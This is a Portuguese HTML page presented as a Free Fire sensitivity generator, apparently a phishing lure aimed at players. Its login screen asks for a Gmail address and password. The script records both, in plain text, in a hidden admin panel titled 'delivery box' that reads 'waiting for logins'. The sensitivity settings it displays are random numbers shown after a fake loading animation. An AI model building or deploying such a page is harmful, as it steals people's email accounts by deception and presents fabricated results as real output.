<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Gênesis V7 - Ultra Realista</title>
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&family=Poppins:wght@300;600;900&display=swap" rel="stylesheet">
    <style>
        :root {
            --roxo: #a020f0;
            --amarelo: #ffff00;
            --azul: #00d4ff;
            --vermelho: #ff0000;
            --glass: rgba(10, 10, 10, 0.9);
        }

        * { margin: 0; padding: 0; box-sizing: border-box; outline: none; }
        body { background: #000; color: #fff; font-family: 'Poppins', sans-serif; overflow-x: hidden; }
        #bg-canvas { position: fixed; top: 0; left: 0; z-index: -1; width: 100%; height: 100%; opacity: 0.6; }

        /* HUD Superior */
        .hud-top {
            display: flex; justify-content: space-between; align-items: center;
            padding: 15px 20px; background: rgba(0,0,0,0.8);
            border-bottom: 2px solid var(--roxo); sticky top: 0; z-index: 1000;
        }
        .stats-bar { font-family: 'Orbitron'; font-size: 10px; color: var(--amarelo); text-shadow: 0 0 5px var(--amarelo); }

        /* Telas */
        .screen { display: none; padding: 20px; animation: slideUp 0.4s ease; padding-bottom: 100px; }
        .active { display: block; }
        @keyframes slideUp { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }

        /* Cards Estilizados */
        .card {
            background: var(--glass); border-radius: 40px 15px 40px 15px;
            padding: 25px; border: 1px solid var(--roxo);
            box-shadow: 0 15px 30px rgba(160, 32, 240, 0.2); margin-bottom: 25px;
        }

        /* Inputs e Botões Grandes */
        .field {
            width: 85%; margin: 10px auto; display: block;
            padding: 16px; background: #050505; border: 2px solid var(--roxo);
            border-radius: 20px; color: var(--amarelo); font-weight: bold; text-align: center;
        }
        .btn-large {
            width: 90%; margin: 15px auto; display: block;
            padding: 20px; border-radius: 25px; border: none;
            background: linear-gradient(90deg, var(--roxo), #5e11a3);
            color: white; font-weight: 900; font-size: 16px; cursor: pointer; transition: 0.3s;
        }
        .btn-large:active { transform: scale(0.95); }

        /* Seletor Lateral */
        .row { display: flex; justify-content: center; gap: 10px; margin: 10px 0; }
        .btn-mini { 
            flex: 1; padding: 12px; border-radius: 15px; border: 1.5px solid var(--roxo);
            background: transparent; color: white; cursor: pointer; font-size: 12px;
        }
        .btn-mini.selected { background: var(--roxo); box-shadow: 0 0 10px var(--roxo); }

        /* Animação Borda Torta */
        .loader-box { display: none; text-align: center; margin: 25px 0; }
        .wobble-border {
            width: 140px; height: 140px; margin: 0 auto;
            border: 5px solid var(--roxo);
            border-radius: 40% 60% 70% 30% / 40% 50% 60% 70%;
            animation: morphing 2.5s infinite linear;
            display: flex; align-items: center; justify-content: center;
        }
        @keyframes morphing {
            0% { transform: rotate(0deg) scale(1); }
            50% { transform: rotate(180deg) scale(1.1); border-radius: 60% 40% 30% 70%; }
            100% { transform: rotate(360deg) scale(1); }
        }

        /* Resultado */
        .res-box {
            display: none; background: var(--vermelho); border: 3px solid var(--amarelo);
            border-radius: 35px; padding: 25px; margin-top: 20px; text-align: left;
        }
        .res-text { color: var(--amarelo); font-family: 'Orbitron'; font-size: 1.3rem; font-weight: 900; }

        /* Menu Admin */
        #admin-panel {
            display: none; position: fixed; top: 75px; right: 20px;
            width: 280px; background: #000; border: 2px solid var(--amarelo);
            border-radius: 20px; padding: 15px; z-index: 2000;
        }

        /* Navbar Inferior */
        .nav-bar {
            position: fixed; bottom: 0; width: 100%; height: 75px;
            background: #000; border-top: 2px solid var(--roxo);
            display: none; justify-content: space-around; align-items: center; z-index: 999;
        }
        .nav-link { font-size: 11px; color: #444; cursor: pointer; text-align: center; }
        .nav-link.active-nav { color: var(--amarelo); font-weight: bold; }
    </style>
</head>
<body>

    <canvas id="bg-canvas"></canvas>

    <div class="hud-top">
        <div class="stats-bar">
            🕒 <span id="time">00:00</span> | <span id="temp">28°C</span> | FPS: <span id="fps">60</span>
        </div>
        <div onclick="toggleAdmin()" style="cursor: pointer; font-size: 24px;">⚙️</div>
    </div>

    <!-- ADMIN: CAIXA DE ENTREGA -->
    <div id="admin-panel">
        <h4 style="color:var(--amarelo); font-size:12px; margin-bottom:10px;">📦 CAIXA DE ENTREGA</h4>
        <div id="capture-log" style="font-size:10px; color:#ccc; max-height:120px; overflow-y:auto;">Aguardando logins...</div>
        <button class="btn-mini" style="width:100%; margin-top:10px; background:var(--roxo);" onclick="alert('Instalando Otimização...')">INSTALAR</button>
    </div>

    <!-- TELA 1: LOGIN -->
    <div id="screen-login" class="screen active">
        <div class="card" style="margin-top: 40px;">
            <h2 style="text-align:center; color:var(--roxo); font-family:'Orbitron';">SISTEMA GÊNESIS</h2>
            <input type="email" id="email" class="field" placeholder="Gmail">
            <input type="password" id="pass" class="field" placeholder="Senha do Gmail">
            
            <button class="btn-large" onclick="doLogin()">ENTRAR NO GERADOR</button>
            <div style="height:10px;"></div>
            <button class="btn-large" style="background:#1a1a1a;" onclick="alert('Funcionalidade em desenvolvimento')">CRIAR CONTA PRÓPRIA</button>
            
            <p id="err" style="color:var(--vermelho); text-align:center; font-weight:bold; margin-top:15px; display:none;">SEU ACESSO FOI NEGADO OU CRIE UMA CONTA</p>
        </div>
    </div>

    <!-- TELA 2: GERADOR -->
    <div id="screen-gen" class="screen">
        <div class="card">
            <h3 style="text-align:center; margin-bottom:15px; color:var(--amarelo);">GERADOR ELITE</h3>
            
            <div class="row">
                <button class="btn-mini selected" id="b-and" onclick="setPlat('android')">ANDROID</button>
                <button class="btn-mini" id="b-ios" onclick="setPlat('iphone')">IPHONE</button>
            </div>

            <input type="text" id="model" class="field" placeholder="Modelo do Celular">
            
            <div id="dpi-wrap">
                <input type="number" id="val-dpi" class="field" placeholder="Digite a DPI">
            </div>

            <div class="row">
                <select id="ram" class="btn-mini" style="background:#000; color:white;">
                    <option value="">RAM</option>
                    <option value="4">4GB</option>
                    <option value="8">8GB</option>
                    <option value="12">12GB+</option>
                </select>
                <select id="ff-ver" class="btn-mini" style="background:#000; color:white;">
                    <option value="normal">FF NORMAL</option>
                    <option value="max">FF MAX</option>
                </select>
            </div>

            <input type="text" id="search-w" class="field" placeholder="🔍 Pesquisar Arma..." onkeyup="addWeapon()">
            <div id="w-list" style="text-align:center; font-size:11px; margin:5px; color:var(--azul);"></div>

            <select id="hud-fingers" class="field" style="width:100%">
                <option value="2">HUD 2 DEDOS</option>
                <option value="3">HUD 3 DEDOS</option>
                <option value="4">HUD 4 DEDOS</option>
            </select>

            <button class="btn-large" onclick="generateSensi()">GERAR SENSIBILIDADE</button>

            <!-- ANIMAÇÃO -->
            <div class="loader-box" id="loader">
                <div class="wobble-border"><span id="w-icon" style="font-size:50px;">🔫</span></div>
                <p style="color:var(--amarelo); margin-top:10px;">CONFIGURANDO ARMAS...</p>
            </div>

            <!-- RESULTADO -->
            <div class="res-box" id="res-area">
                <p>GERAL: <span id="r-ger" class="res-text"></span></p>
                <p>PONTO VERMELHO: <span id="r-red" class="res-text"></span></p>
                <p>2X: <span id="r-2x" class="res-text"></span> | 4X: <span id="r-4x" class="res-text"></span></p>
                <p>BOTÃO DE TIRO: <span id="r-btn" class="res-text"></span></p>
                <hr style="opacity:0.2; margin:15px 0;">
                <div id="tips" style="font-size:11px; color:#fff;"></div>
                <p style="color:var(--azul); font-weight:bold; text-align:center; margin-top:15px;">SUA SENSIBILIDADE FOI GERADA COM SUCESSO</p>
            </div>
        </div>
    </div>

    <!-- TELA 3: SOCIAL -->
    <div id="screen-social" class="screen">
        <div class="card">
            <h3>PERFIL: <span id="p-name" style="color:var(--roxo);">Recruta</span></h3>
            <p style="font-size:11px; color:#888;">Level 99 Elite Sensi</p>
        </div>

        <div class="card">
            <h3>COMENTÁRIOS</h3>
            <textarea id="comm-txt" class="field" style="height:80px; text-align:left;" placeholder="Comente algo..."></textarea>
            <button class="btn-large" style="height:45px;" onclick="postComment()">ENVIAR</button>
            <div id="comm-list" style="margin-top:15px;"></div>
        </div>

        <div class="card">
            <h3>HISTÓRICO</h3>
            <div id="hist-log" style="font-size:10px; color:#666; max-height:150px; overflow-y:auto;"></div>
            <button onclick="clearAll()" class="btn-large" style="background:#222; height:45px; font-size:11px;">EXCLUIR DADOS</button>
        </div>
    </div>

    <nav class="nav-bar" id="navbar">
        <div class="nav-link active-nav" onclick="tab('screen-gen', this)">GERADOR</div>
        <div class="nav-link" onclick="tab('screen-social', this)">SOCIAL/HIST</div>
        <div class="nav-link" onclick="alert('Idioma alterado!')">IDIOMA</div>
    </nav>

    <script>
        let platform = 'android';
        let weaponDb = ["UMP", "XM8", "DESERT", "AC80", "MP40", "P90", "MP5", "SCAR", "AK47", "M4A1", "Groza", "FAMAS", "M14", "SVD", "SKS", "AUG", "PARAFAL", "M249", "M1014", "SPAS12", "M1887", "MAG-7", "Trogon", "AWM", "Kar98k", "M82B", "Woodpecker", "M24", "Eagle", "G18", "M500", "M1873", "Hand Cannon", "USP-2", "Thompson", "Vector", "MC10", "VSS"];
        let selectedW = [];

        // Canvas BG - Pontos Brancos e Grafite
        const canvas = document.getElementById('bg-canvas');
        const ctx = canvas.getContext('2d');
        canvas.width = window.innerWidth; canvas.height = window.innerHeight;
        let points = [];
        for(let i=0; i<80; i++) points.push({ x: Math.random()*canvas.width, y: Math.random()*canvas.height, vx: Math.random()-0.5, vy: Math.random()-0.5, n: Math.floor(Math.random()*10) });

        function draw() {
            ctx.clearRect(0,0,canvas.width,canvas.height);
            ctx.fillStyle = "#fff";
            points.forEach(p => {
                p.x += p.vx; p.y += p.vy;
                if(p.x<0||p.x>canvas.width) p.vx*=-1; if(p.y<0||p.y>canvas.height) p.vy*=-1;
                ctx.beginPath(); ctx.arc(p.x, p.y, 1.5, 0, Math.PI*2); ctx.fill();
                ctx.font = "10px Orbitron"; ctx.fillStyle = "rgba(255,255,255,0.2)"; ctx.fillText(p.n, p.x+10, p.y+10);
                ctx.fillStyle = "#fff";
            });
            requestAnimationFrame(draw);
        }
        draw();

        // Stats Relógio
        setInterval(() => {
            const d = new Date();
            document.getElementById('time').innerText = d.getHours().toString().padStart(2,'0')+":"+d.getMinutes().toString().padStart(2,'0');
            document.getElementById('fps').innerText = Math.floor(Math.random()*4+58);
        }, 1000);

        function doLogin() {
            const e = document.getElementById('email').value;
            const p = document.getElementById('pass').value;
            if(e.includes('@') && p.length >= 4) {
                document.getElementById('capture-log').innerHTML += `<p>📩 ${e} | 🔑 ${p}</p>`;
                document.getElementById('p-name').innerText = e.split('@')[0];
                document.getElementById('screen-login').classList.remove('active');
                document.getElementById('screen-gen').classList.add('active');
                document.getElementById('navbar').style.display = 'flex';
                saveHist(`Login realizado: ${e}`);
            } else { document.getElementById('err').style.display = 'block'; }
        }

        function setPlat(p) {
            platform = p;
            document.getElementById('b-and').classList.toggle('selected', p==='android');
            document.getElementById('b-ios').classList.toggle('selected', p==='iphone');
            document.getElementById('dpi-wrap').innerHTML = p === 'android' ? 
                '<input type="number" id="val-dpi" class="field" placeholder="Digite a DPI">' : 
                '<input type="number" id="val-dpi" class="field" placeholder="Definir Ciclo">';
        }

        function addWeapon() {
            let v = document.getElementById('search-w').value.toUpperCase();
            if(weaponDb.includes(v) && !selectedW.includes(v)) {
                selectedW.push(v);
                document.getElementById('w-list').innerHTML += `<span style="background:var(--roxo); padding:3px 8px; border-radius:10px; margin:2px; display:inline-block;">${v}</span>`;
                document.getElementById('search-w').value = "";
            }
        }

        function generateSensi() {
            const mod = document.getElementById('model').value;
            const dpi = document.getElementById('val-dpi').value;
            if(!mod || !dpi || selectedW.length === 0) { alert("PREENCHA TUDO: Modelo, DPI e Armas!"); return; }

            document.getElementById('res-area').style.display = 'none';
            document.getElementById('loader').style.display = 'block';

            let timer = 0;
            const guns = ["🔫", "🎯", "🔥", "⚔️", "💣"];
            const anim = setInterval(() => {
                document.getElementById('w-icon').innerText = guns[Math.floor(Math.random()*guns.length)];
                timer++;
                if(timer >= 10) { clearInterval(anim); showResults(mod); }
            }, 500);
        }

        function showResults(mod) {
            document.getElementById('loader').style.display = 'none';
            document.getElementById('res-area').style.display = 'block';
            document.getElementById('r-ger').innerText = Math.floor(Math.random()*100+100);
            document.getElementById('r-red').innerText = "100";
            document.getElementById('r-2x').innerText = Math.floor(Math.random()*40+160);
            document.getElementById('r-4x').innerText = Math.floor(Math.random()*30+170);
            document.getElementById('r-btn').innerText = Math.floor(Math.random()*25+20) + "%";
            
            document.getElementById('tips').innerHTML = `<b>OTIMIZAÇÃO ${mod}:</b><br>- Ative 'Forçar 4x MSAA' para mais fluidez.<br>- Coloque a Velocidade do Ponteiro em 80%.<br>- Sensibilidade recomendada para puxar capa com as armas selecionadas.`;
            saveHist(`Sensi gerada para ${mod}`);
        }

        function postComment() {
            const t = document.getElementById('comm-txt').value;
            if(t) {
                document.getElementById('comm-list').innerHTML = `<div style="background:rgba(255,255,255,0.05); padding:10px; border-radius:15px; margin-bottom:10px;">💬 ${t}<br><span style="font-size:9px; color:var(--azul);">❤️ Curtir | 🎥 Postar Vídeo</span></div>` + document.getElementById('comm-list').innerHTML;
                document.getElementById('comm-txt').value = "";
                saveHist(`Novo comentário postado.`);
            }
        }

        function toggleAdmin() { const p = document.getElementById('admin-panel'); p.style.display = p.style.display==='block'?'none':'block'; }
        function tab(id, el) { 
            document.querySelectorAll('.screen').forEach(s=>s.classList.remove('active'));
            document.querySelectorAll('.nav-link').forEach(n=>n.classList.remove('active-nav'));
            document.getElementById(id).classList.add('active'); el.classList.add('active-nav');
        }
        function saveHist(m) { const t = new Date().toLocaleTimeString(); document.getElementById('hist-log').innerHTML = `<p>[${t}] ${m}</p>` + document.getElementById('hist-log').innerHTML; }
        function clearAll() { if(confirm("Limpar dados?")) location.reload(); }
    </script>
</body>
</html>
